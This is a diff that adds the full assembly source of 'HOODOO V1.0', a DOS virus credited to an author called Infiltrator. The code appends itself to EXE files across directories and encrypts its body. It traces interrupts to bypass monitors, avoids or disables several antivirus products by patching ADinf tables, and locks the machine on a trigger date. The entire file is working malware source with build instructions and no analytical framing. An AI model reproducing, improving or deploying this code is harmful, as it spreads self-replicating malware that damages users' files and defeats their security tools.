@@ -1,0 +1,1171 @@
+;****************************************************************************
+; Virus name    : HOODOO V1.0
+; Author        : Infiltrator (FATAL BREAKPOINT BBS)
+; Origin        : St-Petersburg, RUSSIA, January 1, 1996
+; Compiling     : TASM HOODOO.ASM
+;                 TLINK /T HOODOO.OBJ
+;---------------------------------------------------------------------------
+; Targets       : EXE files from current dir to root
+; Size          : 2609 bytes
+; Polymorphic   : No
+; Encryption    : Yes
+; Stealth       : No
+; Tunneling     : Yes
+; Retro         : Yes
+; Antiheuristics: Yes
+;****************************************************************************
+
+
+;===================== Macros used for direct int calls=================
+int_21h Macro
+        pushf
+        cli
+        call dword ptr [real_int21][si]
+        Endm
+
+;-------------------------------------------------------------------
+int_13h Macro
+        pushf
+        cli
+        call dword ptr [real_int13][si]
+        Endm
+;--------------------------------------------------------------------
+        Attributs       EQU     15h
+        File_time       EQU     16h
+        File_date       EQU     18h
+        File_size       EQU     1Ah
+        File_name       EQU     1Eh
+;--------------------------------------------------------------------
+;AAM - used to fool some lame analysers
+al_to_ah	Macro
+		db 0D4h,1
+		EndM
+;--------------------------------------------------------------------
+.model tiny
+.code
+.startup
+.286
+
+virus_start:
+
+	db	3Eh,0FCh			;fooling code
+	
+	push ax bx cx dx si di bp ds 		;saving all registers!
+	push es
+
+        mov ax,cs
+        mov ds,ax
+        mov es,ax
+
+;Performing old trick
+        call old_trick
+
+old_trick:
+	db	26h,0FCh	; fool code
+
+	mov bp,sp
+	mov si,ss:[bp]
+	inc sp
+	inc sp
+        sub si,offset old_trick
+	
+	lea ax,code_decode[si]
+	mov dx,cs
+	xor cx,cx
+	mov es,cx
+
+	xchg ax,word ptr es:[0]
+	xchg dx,word ptr es:[2]
+	mov word ptr old_int0[si],ax
+	mov word ptr old_int0[si+2],dx
+
+	div cx	;performing a divide by ZERO to call code_decode (en/decryption)
+
+;---------------------------[ coded part ]-----------------------------
+code_start:
+	mov ax,cs
+	mov es,ax
+
+	push si
+	xchg bp,si
+
+        lea si,real_jump[bp]
+        lea di,current_jump[bp]
+        movsw
+        movsw                                   ;restoring last jump
+
+	pop si
+
+	xor ax,ax
+	push ax
+	pop cx
+	dec sp
+	dec sp
+	pop bx
+
+	cmp cx,bx
+	jz not_tracing
+
+	mov byte ptr td_present[si],255
+
+not_tracing:	
+;---------------------------------------------------------------------
+Get_DOS_version:
+        mov ax,3001h
+        int 21h
+        cmp al,5
+        jae check_8086
+        jmp bad_environment
+
+check_8086:
+        mov byte ptr avp_TSR_present[si],0
+
+;--------------------------------------------------------------------
+;Check if 8086
+        push sp
+        pop ax
+        cmp ax,sp
+        jz _286
+        jmp bad_environment
+
+_286:
+;--------------------------------------------------------------------
+;Check avp TSR
+	call check_avp_TSR
+;--------------------------------------------------------------------
+;check for 386+
+
+        mov ax,7000h
+        pushf
+        push ax
+        popf
+        pushf
+        pop ax
+        popf
+        and ax,7000h         ; check for flag 
+        jz short _80286     ; if ax=0 then this is a 80286
+
+;--------------------------------------------------------------------
+;Check OS/2
+        mov ax,4010h
+        int 2Fh
+        cmp ax,4010h
+	jz No_OS2
+        jmp bad_environment
+
+No_OS2:
+;--------------------------------------------------------------------
+_80286:
+;Find DOS segment
+
+        mov ah,34h
+        int 21h                 ;DOS activity flag
+
+        mov word ptr [real_int21+2][si],es          ;store DOS seg
+
+        mov ax,3501h
+        int 21h
+
+        mov word ptr [old_int1][si],bx
+        mov word ptr [old_int1+2][si],es            ;saving old int1
+
+	mov ah,25h
+        lea dx,trace_handler[si]
+        int 21h                                 ;setting int1 handler
+
+        mov search_DOS[si],0
+	mov trace_report[si],0
+        xor ax,ax
+        mov es,ax
+
+        pushf
+        pop ax
+        or ah,1                 ; turn on trap flag
+        push ax
+        in al,21h                  ; Get old IMR
+        mov IMR[si],al
+        mov al,0FFh                 ; disable all interrupts
+        out 21h,al
+        popf
+
+        mov dl,80h              	;Drive C:
+        mov ah,9        	        ;reset HD controller
+        pushf
+        call dword ptr es:[13h*4]              ;simulate int 13h
+
+        pushf
+        pop ax
+        or ah,1		           ;Set TF for 2-nd tracing
+        push ax
+        popf
+
+        mov search_DOS[si],1
+        xor ax,ax
+        mov es,ax
+        mov ax,3001h				;Get DOS version
+        pushf
+        call dword ptr es:[21h*4]            ;Simulate int 21h
+
+        pushf
+        pop ax
+        and ax,0FEFFh           ;clear TF
+        push ax
+        popf
+
+        mov al,IMR[si]           ; reenable interrupts
+        out 21h,al
+
+	test trace_report[si],1
+	jnz traced_13
+	jmp bad_environment
+
+traced_13:
+;------------------------------------------------------------------------
+;Check avp TSR presence
+        cmp byte ptr avp_TSR_present[si],0
+        jz avp_not_present
+
+        call time_has_come
+
+avp_not_present:        
+;------------------------------------------------------------------------
+;test bit 1 of TD_presence
+        test byte ptr td_present[si],1
+        jz td_not_present
+
+	call time_has_come
+
+td_not_present:
+;------------------------------------------------------------------------
+	db	36h,0FBh	;fooling code
+
+        mov ah,4
+        int 1Ah         ;Get date
+
+        cmp dl,21h        ;day 21?
+        jnz not_yet
+
+        call time_has_come
+
+not_yet:
+
+;-----------------------------------------------------------------------
+
+	test trace_report[si],2
+	jnz traced_21
+	jmp bad_environment
+	
+;-----------------------------------------------------------------------
+;setting vector 13 to BIOS
+;-----------------------------------------------------------------------
+traced_21:
+	db 26h, 0F8h		;fooling code
+	
+	xor ax,ax
+	mov es,ax			;additionnal warranty
+
+        push word ptr es:[13h*4]
+        push word ptr es:[13h*4+2]      ;old vector 13
+
+        push word ptr [real_int13][si]
+        push word ptr [real_int13+2][si]    ;real vector 13
+
+        cli
+        pop word ptr es:[13h*4+2]
+        pop word ptr es:[13h*4]         ;Critical !
+        sti
+
+        pop word ptr [real_int13+2][si]
+        pop word ptr [real_int13][si]
+
+;------------------------------------------------------------------
+; restoring int1
+;------------------------------------------------------------------
+
+        push word ptr [old_int1][si]
+        push word ptr [old_int1+2][si]
+
+        cli
+        pop word ptr es:[1*4+2]
+        pop word ptr es:[1*4]
+        sti
+
+;get current default drive
+        mov ah,19h
+        int 21h
+        cmp al,2		;don't infect floppies
+	jnc get_free_disk_space
+	jmp bad_environment
+
+get_free_disk_space:
+        mov ah,36h
+        xor dl,dl
+        int 21h
+        cmp ax,0FFFFh
+	jnz check_for_20k
+        jmp bad_environment
+
+check_for_20k:
+        mul cx
+        mul bx
+
+        or dx,dx
+        jnz enough_disk_space
+
+        cmp ax,20*1024          ;check if there are 20 kb free!
+	jnc enough_disk_space
+	jmp bad_environment
+
+enough_disk_space:
+;---------------------------------------------------------------
+;Get initial dir
+	xchg si,bp		;store SI value!
+
+	mov ah,47h
+	xor dl,dl
+	lea si,initial_dir[bp+1]
+	int 21h			
+
+	xchg si,bp
+;-----------------------------------------------------------------
+;Get old DTA address into ES:BX
+	mov ah,2Fh
+	int 21h
+	mov word ptr [old_DTA][si],bx
+	mov word ptr [old_DTA+2][si],es
+;-----------------------------------------------------------------
+;Set new DTA
+	mov ah,1Ah
+	lea dx,DTA[si]
+	int 21h
+
+;=================== Searching and infecting ====================
+
+	in al,21h
+	mov IMR[si],al
+	or al,2		;masking kb interrupts
+	out 21h,al
+
+	mov bingo[si],0
+
+Find_first_EXE:
+
+	mov ah,4Eh
+
+        lea dx,exe_mask[si]
+        int_21h
+
+        cmp al,12h
+        jz no_more_exe_files
+
+        call infect_file
+
+Find_next_EXE:
+
+	mov ah,4Fh
+
+	lea dx,exe_mask[si]
+        int_21h
+        cmp al,12h
+        jz no_more_exe_files
+
+        call infect_file
+
+        jmp short Find_next_EXE
+
+no_more_exe_files:
+;--------------------------------------------------------------
+;Change to upper dir
+        mov ah,3Bh
+        lea dx,upper_dir[si]
+        int_21h
+        jnc Find_first_EXE
+;---------------------------------------------------------------
+;Guess what
+        cmp bingo[si],0
+        jz no_need_adinf
+	call kill_adinf
+
+no_need_adinf:
+
+;======================== Infections achieved! =================
+
+;Returning to initial dir
+	mov ah,3Bh
+	lea dx,initial_dir[si]
+	int_21h
+
+	mov al,IMR[si]
+	out 21h,al		;re-enabling kb interrupts
+;Restoring Old DTA 
+	push ds
+
+        mov dx,word ptr old_DTA[si]	;offset
+        mov ax,word ptr old_DTA[si+2]	;seg
+	mov ds,ax
+
+	mov ah,1Ah
+        int 21h
+
+	pop ds 
+;-----------------------------------------------------------------
+; restore int13
+;-----------------------------------------------------------------
+
+	xor ax,ax
+	mov es,ax			;additional warranty
+
+        push word ptr es:[13h*4]
+        push word ptr es:[13h*4+2]      ;real vector 13
+
+        push word ptr [real_int13][si]
+        push word ptr [real_int13+2][si]    ;old vector 13
+
+        cli
+        pop word ptr es:[13h*4+2]
+        pop word ptr es:[13h*4]         ;Critical!
+        sti
+
+        pop word ptr [real_int13+2][si]
+        pop word ptr [real_int13][si]
+;----------------------------------------------------------------------
+;restore int 0
+;----------------------------------------------------------------------
+
+	mov ax,word ptr old_int0[si]
+	mov dx,word ptr old_int0[si+2]
+	
+	xchg ax,es:[0]	
+	xchg dx,es:[2]	
+
+;--------------------------------------------------------------------
+
+bad_environment:
+        pop es
+        mov ax,es                    ;AX = PSP segment
+        add ax,10h                   ;Adjust for PSP
+        add word ptr [current_jump+2][si],ax
+
+        jmp $+2
+
+;	mov ah,9
+;	lea dx,msg[si]
+;	int 21h
+	
+	pop ds bp di si dx cx bx ax	;restoring all registers!
+
+        db      0EAh
+current_jump    dd      0
+real_jump       dw      offset virus_end,0-10h
+
+initial_dir	db	'\',64 dup(0)
+upper_dir	db	'..',0
+exe_mask	db	'*.exe',0
+header          db      18h dup(0)               ;exe-header
+bingo		db	0			;=1 when infection has occured
+						;and need to patch adinf
+adinf_path      db      '*.*',0
+ad_table        db      13 dup(0)
+buffer		db	512 dup(0)		;needed to read adinf table
+old_DTA		dd	0	
+DTA		db	128 dup(0)
+real_int13      dd      0
+search_DOS      db      0
+old_int1        dd      0
+trace_report	db	0
+IMR             db      0
+msg		db	13,10,7,7,"HOODOO V1.0 (c)1995 by Infiltrator. "
+		db	"Please register.$"
+;Need to fuck avp
+antiviral_msg   db      20h,0Dh,0Ah,'Antiviral$'
+antimsg_len     equ     $-antiviral_msg
+
+;Need to fuck avp TSR
+avp_TSR_present	db	0		
+
+;=======================[ TRACE HANDLER ]================================
+
+trace_handler:
+
+        push bp ax cx es si
+
+        mov bp,sp
+
+        cmp search_DOS[si],1
+        je skip_13
+
+        mov ax,ss:[bp+12]                 ;CS
+        cmp ax,0C000h
+        jb exit_trace
+
+        mov ax,ss:[bp+10]                   ;IP
+        mov cl,4
+        shr ax,cl
+        add ax,ss:[bp+12]
+        jc exit_trace           ;0FFFFh seg overflow
+
+        mov ax,ss:[bp+10]
+        mov word ptr ds:[real_int13][si],ax
+        mov ax,ss:[bp+12]
+        mov word ptr ds:[real_int13+2][si],ax
+
+	or trace_report[si],1	;mark as found
+        jmp short found_13
+
+skip_13:
+        mov ax,ss:[bp+12]                   ;DOS CS
+        cmp ax,word ptr ds:[real_int21+2][si]
+        jnz exit_trace
+
+        mov ax,ss:[bp+10]
+        mov word ptr ds:[real_int21][si],ax    ;DOS IP
+	or trace_report[si],2		;mark as found
+
+found_13:
+        mov ax,ss:[bp+14]
+        and ax,0FEFFh           ;clear TF in stack
+        mov ss:[bp+14],ax
+
+exit_trace:
+
+        pop si es cx ax bp
+        iret
+;====================[ Infecting file ]==================================
+infect_file	proc
+
+;Preparing encrypting value
+retry_value:
+	mov ah,0
+	int 1Ah
+	or dl,dl
+	jz retry_value
+	mov encrypt_value[si],dl
+
+	mov ax,4301h
+	xor cx,cx
+	lea dx,[DTA+File_name][si]
+	int 21h			;clear attributs
+
+	mov al,3Dh
+	al_to_ah
+	mov al,02h		
+;	mov ax,3D02h
+        lea dx,[DTA+File_name][si]
+        int_21h
+        xchg bx,ax
+
+
+	mov al,3Fh
+	al_to_ah
+;	mov ah,3Fh
+        mov cx,18h      ;read header
+        lea dx,header[si]
+        int_21h
+
+;Check for 0E9h
+
+        cmp byte ptr ds:[header+si],0E9h	;misnamed COM
+	jnz check_for_EB
+        jmp close_file
+
+check_for_EB:
+        cmp byte ptr ds:[header+si],0EBh	;misnamed COM
+	jnz check_4_MZ
+        jmp close_file
+
+Check_4_MZ:
+        cmp word ptr ds:[header+si],'ZM'	;Real EXE file?
+	jz check_4_size
+        jmp close_file
+
+check_4_size:
+	cmp word ptr [DTA+file_size+2][si],0
+	jnz size_ok
+
+	cmp word ptr [DTA+file_size][si],20*1024	;20kb
+	jnc size_ok
+	jmp close_file
+
+size_ok:
+        mov ax,4200h
+        mov cx,word ptr [DTA+File_size+2][si]
+        mov dx,word ptr [DTA+File_size][si]
+        dec dx                  ;point to last word in file
+	dec dx
+        int_21h
+
+;Check if already infected
+        mov ah,3Fh
+        mov cx,2		;read 2 bytes
+        lea dx,ID_word[si]
+        int_21h
+
+	mov ax,ID_word[si]
+	cmp ax,word ptr [DTA+16h][si]
+
+        jnz not_infected
+	jmp close_file
+
+
+not_infected:
+;----------------------------------------------------------------------
+;Check if it's aidstest
+
+	mov ax,4200h
+	xor cx,cx
+	mov dx,131		;offset in aidstest.exe
+	int 21h
+
+	mov ah,3Fh
+	mov cx,23		;read bytes
+	lea dx,buffer[si]
+	int 21h
+
+        cmp byte ptr buffer[si],''
+        jz other_smile
+        jmp not_aidstest
+
+other_smile:
+        cmp byte ptr buffer[si+22],''
+        jnz not_aidstest
+        jmp close_file
+
+not_aidstest:
+;----------------------------------------------------------------------
+;Check if it's web
+
+	mov ax,4200h
+	xor cx,cx
+	mov dx,29h		;offset in drweb.exe
+	int 21h
+
+	mov ah,3Fh
+	mov cx,4		;read bytes
+	lea dx,buffer[si]
+	int 21h
+
+	mov al,''
+
+	cmp byte ptr buffer[si],al
+	jz other_face
+	jmp not_web
+
+other_face:
+	cmp byte ptr buffer[si+3],al
+	jnz not_web
+	jmp close_file
+
+not_web:
+;----------------------------------------------------------------------
+;Check if it's adinf
+	
+	mov ax,4200h
+	xor cx,cx
+	mov dx,29h		;offset in adinf.exe
+	int 21h
+
+	mov ah,3Fh
+	mov cx,8		;read bytes
+	lea dx,buffer[si]
+	int 21h
+
+	mov al,''
+
+	cmp byte ptr buffer[si],al
+	jz second_face
+	jmp not_adinf
+
+second_face:
+	cmp byte ptr buffer[si+7],al
+	jnz not_adinf
+	jmp close_file
+
+not_adinf:
+;----------------------------------------------------------------
+;Check if Norton Antivirus 2.0
+
+	mov ax,4200h
+	xor cx,cx
+	mov dx,32h		;offset in nav.exe
+	int 21h
+
+	mov ah,3Fh
+	mov cx,8
+	lea dx,buffer[si]
+	int 21h
+
+;check for 'Sy' (Symantec)
+        cmp word ptr buffer[si],7953h
+	jz check_ec
+	jmp not_nav20
+
+;check for 'ec'
+check_ec:
+	cmp word ptr buffer[si+6],6365h
+	jnz not_nav20
+        jmp close_file
+
+not_nav20:
+;-------------------------------------------------------------------
+;Checking for overlay and infecting
+
+	mov al,42h
+	al_to_ah
+	mov al,02h
+;	mov ax,4202h
+        cwd
+        xor cx,cx
+        int_21h         ;EOF
+
+        push bx
+        push ax
+        push dx
+
+        call convert_size_to_pages
+
+        cmp dx,word ptr [header+4][si]
+        jz ovl1
+
+	pop dx	
+	pop ax
+	pop bx			;handle
+	jmp close_file
+ovl1:
+        cmp ax,word ptr [header+2][si]            ;checking for overlay
+        jz ovl2
+	
+	pop dx
+	pop ax
+	pop bx			;handle
+	jmp close_file
+ovl2:
+
+	pop dx
+	pop ax
+	push ax
+	push dx
+	
+        mov cx,word ptr [header+14h][si]
+        mov word ptr [real_jump][si],cx         ;IP
+        mov cx,word ptr [header+16h][si]
+        mov word ptr [real_jump+2][si],cx               ;CS
+
+        mov bx,word ptr [header+8][si]
+        mov cl,4
+        shl bx,cl
+
+        sub ax,bx
+        sbb dx,0                ;sub header from file size
+
+        mov cx,10h
+        div cx                  ;convert to seg:offset
+
+        mov word ptr [header+14h][si],dx        ;New entry point
+        mov word ptr [header+16h][si],ax
+
+        mov word ptr [header+0Eh][si],ax        ;new stack segment
+
+	mov ah, byte ptr [DTA+File_date][si]	;ah=high byte of date (year)
+	mov al, byte ptr [DTA+File_size][si]	;al=low byte of file size
+        mov word ptr [header+10h][si],ax	;New SP
+
+        pop dx
+        pop ax
+
+        add ax,virus_end-virus_start
+        adc dx,0
+
+        call convert_size_to_pages
+
+        mov word ptr [header+4][si],dx          ;new file size
+        mov word ptr [header+2][si],ax
+
+        add word ptr [header+0Ah][si],virus_end-virus_start
+        jnc $+8
+        mov word ptr [header+0Ah][si],0FFFFh            ;min alloc
+
+        add word ptr [header+0Ch][si],virus_end-virus_start
+        jnc $+8
+
+        mov word ptr [header+0Ch][si],0FFFFh            ;max alloc
+
+
+
+;NEED to correct ID word HERE!
+	mov ax,word ptr [DTA+16h][si]
+	mov word ptr ID_word[si],ax
+
+
+        pop bx                  ;restore handle
+
+
+	mov al,40h
+	al_to_ah
+;        mov ah,40h
+        mov cx,virus_end-virus_start
+        lea dx,virus_start[si]
+
+code_mid1:
+
+;	call code_decode		;encrypting virus to be linked
+	div al
+
+        int_21h                 ;append virus to file
+
+	xor ax,ax
+	div al
+;	call code_decode		;de-crypting virus
+
+code_mid2:
+
+	mov bingo[si],1
+
+        mov ax,4200h
+        cwd
+        xor cx,cx
+        int_21h
+
+	mov al,40h
+	al_to_ah
+;        mov ah,40h
+        mov cx,18h
+        lea dx,header[si]	;write new header to file
+        int_21h
+
+;Need to restore time and date
+	mov al,57h
+	al_to_ah
+	mov al,1
+;	mov ax,5701h
+	mov cx,word ptr [DTA+16h][si]	;original time
+	mov dx,word ptr [DTA+18h][si]	;original date
+	int_21h
+
+Close_file:
+
+	mov al,3Eh
+	al_to_ah
+;        mov ah,3Eh
+        int_21h				;close file
+
+;Need to restore attributs
+
+	mov al,43h
+	al_to_ah
+	mov al,1
+;	mov ax,4301h
+	mov cx,word ptr [DTA+15h][si]	;original attributs
+	lea dx,word ptr [DTA+1Eh][si]	;file name
+	int_21h
+
+	retn
+
+infect_file	endp
+
+;======================[ Time has come ]===============================
+
+time_has_come           proc
+
+	in al,21h
+	mov IMR[si],al
+	or al,2
+	out 21h,al		;mask KB interrupts
+
+	lea dx,msg[si]
+	mov ah,9
+	int 21h
+
+        jmp $           ;lock !
+
+time_has_come   endp
+
+;=============================[ Check avp TSR]===============================
+check_avp_TSR	proc
+	pusha
+
+        mov ax,0Ah
+        mov es,ax
+
+	xchg bp,si		;store SI
+
+        mov di,452h
+        lea si,antiviral_msg[bp]
+        mov cx,antimsg_len
+repnz   movsb			;storing 'Antiviral' at 452h
+
+	xchg si,bp		;restore SI
+
+        mov ah,46h
+        mov bx,1
+        mov cx,1
+        int 21h         ;redirect CON to NUL
+
+        push ds
+        mov ax,0Ah
+        mov ds,ax
+        mov ah,9
+        mov dx,452h
+        mov cx,2D64h		;check if avp is installed
+        int 21h
+        pop ds
+
+        push cx
+        mov ah,46h
+        mov bx,0
+        mov cx,1
+        int 21h         ;restoring CON
+        pop cx
+
+        cmp cx,736Dh
+        jnz no_avp
+
+	mov byte ptr avp_TSR_present[si],1
+
+no_avp:
+
+        mov ax,0Ah
+        mov es,ax
+
+        mov di,452h
+        mov cx,antimsg_len
+repnz   stosb                   ;restoring '0' at 452h
+
+	popa
+	ret
+check_avp_TSR	endp
+
+;=======================[ Converting size to pages ]==========================
+convert_size_to_pages   proc
+
+        push ax
+        mov cl,7
+        shl dx,cl
+        and ax,0FE00h
+        mov cl,9
+        shr ax,cl
+        add dx,ax
+        pop ax
+        and ax,1FFh
+        jz $+3
+        inc dx
+        retn
+
+convert_size_to_pages   endp
+
+;==========================[ Kill adinf ]===============================
+Kill_adinf	proc
+	pusha
+
+	mov ax,cs
+	mov es,ax
+
+	mov ah,4Eh			;Find first
+
+;	mov al,4Eh
+;	al_to_ah
+
+	mov cx,2			;find all hidden files!
+	lea dx,adinf_path[si]
+	int_21h
+	cmp al,12h
+	jz patch_done
+	call patch_adinf
+
+next_table:
+	mov ah,4Fh
+;	mov al,4Fh
+;	al_to_ah
+
+	mov cx,2
+	lea dx,adinf_path[si]
+	int_21h	
+	cmp al,12h
+	jz patch_done
+	call patch_adinf
+
+	jmp short next_table
+
+patch_done:
+	popa
+        ret
+
+Kill_adinf	endp
+
+;===========================[ Patch adinf ]===============================
+
+patch_adinf     proc
+
+        lea bx,[DTA+1Eh][si]		;file name in DTA
+        lea di,ad_table[si]
+
+next_letter:
+
+        mov al,[bx]
+        inc bx
+        stosb
+        or al,al
+        jnz next_letter
+
+        mov ax,4301h
+;	mov al,43h
+;	al_to_ah
+;	mov al,1
+
+        xor cx,cx
+        lea dx,ad_table[si]
+        int_21h
+
+        mov ax,3D02h
+;	mov al,3Dh
+;	al_to_ah
+;	mov al,02h
+
+        lea dx,ad_table[si]
+        int_21h
+        xchg ax,bx
+
+        mov ax,4200h
+;	mov al,42h
+;	al_to_ah
+;	mov al,0
+
+        xor cx,cx
+        mov dx,68h              ;point at 'Advanced Diskinfoscope...'
+        int_21h
+
+        mov ah,3Fh
+;	mov al,3Fh
+;	al_to_ah
+
+        mov cx,70h
+        lea dx,buffer[si]
+        int_21h
+
+        cmp word ptr [buffer+si],'dA'
+        jnz fake_adinf
+
+        cmp word ptr [buffer+49h][si],'®Œ'
+        jnz fake_adinf
+
+        mov ax,4200h
+;	mov al,42h
+;	al_to_ah
+;	mov al,0
+
+        xor cx,cx
+        mov dx,200h
+        int_21h
+
+        mov ah,40h
+        mov buffer[si],0
+        lea dx,buffer[si]
+        mov cx,1                ;1 byte patch!
+        int_21h
+
+fake_adinf:
+
+        mov ax,5701h                    ;restoring
+;	mov al,57h
+;	al_to_ah
+;	mov al,1
+
+
+        mov cx,word ptr ds:[DTA+16h][si]    ;file time
+        mov dx,word ptr ds:[DTA+18h][si]    ;file date
+        int_21h
+
+        mov ah,3Eh
+;	mov al,3Eh
+;	al_to_ah
+
+        int_21h
+
+        mov ax,4301h
+;	mov al,43h
+;	al_to_ah
+;	mov al,1
+
+        mov cl,byte ptr ds:[DTA+15h][si]
+        xor ch,ch
+        lea dx,ad_table[si]
+        int_21h                 ;restore attributs
+
+        retn
+
+patch_adinf     endp
+
+;========================[ Mark end of encryption ]=====================
+code_end:
+;=========================[ Encoding/decoding ]=========================
+code_decode	proc
+
+	push ax bx cx di es bp
+
+	mov bp,sp
+	add word ptr ss:[bp+12],2	;coz it still points to 'div cx'
+
+	push cs
+	pop es
+
+	lea bx,code_start[si]
+	mov di,bx
+	mov cx,code_mid1-code_start
+
+        call crypt_cycle                ;crypt/decrypting 1-st half
+
+        lea bx,code_mid2[si]
+        mov di,bx
+        mov cx,code_end-code_mid2
+
+        call crypt_cycle                ;crypt/decrypting 2-nd half
+
+        pop bp es di cx bx ax
+	retf 2
+
+code_decode	endp
+
+;==========================[ Encrypting cycle ]=========================
+
+crypt_cycle	proc
+
+do_crypt:
+
+        mov al,[bx]
+        xor al,encrypt_value[si]
+        stosb
+        inc bx
+
+;Test turbo debugger presence inside loop
+        push cs
+        pop ss
+        pushf
+        pop ax
+        mov byte ptr td_present[si],ah          ;Trap bit stored.
+
+        loop do_crypt
+	retn
+
+crypt_cycle	endp
+;=========================[Various values]=================================
+;Placed here to avoid encryption!
+
+real_int21      dd      0
+old_int0	dd	0
+
+;Need to fuck turbo debugger
+td_present	db	0
+
+;=========================[ Encrypt value ]==============================
+
+encrypt_value	db	0
+
+;========================[ ID BYTE ]=====================================
+
+ID_word         dw      0
+
+;=======================[ Part to be cutted off ]========================
+virus_end:
+        db      0B8h,0,4Ch
+        db      0CDh,21h
+;========================================================================
+end
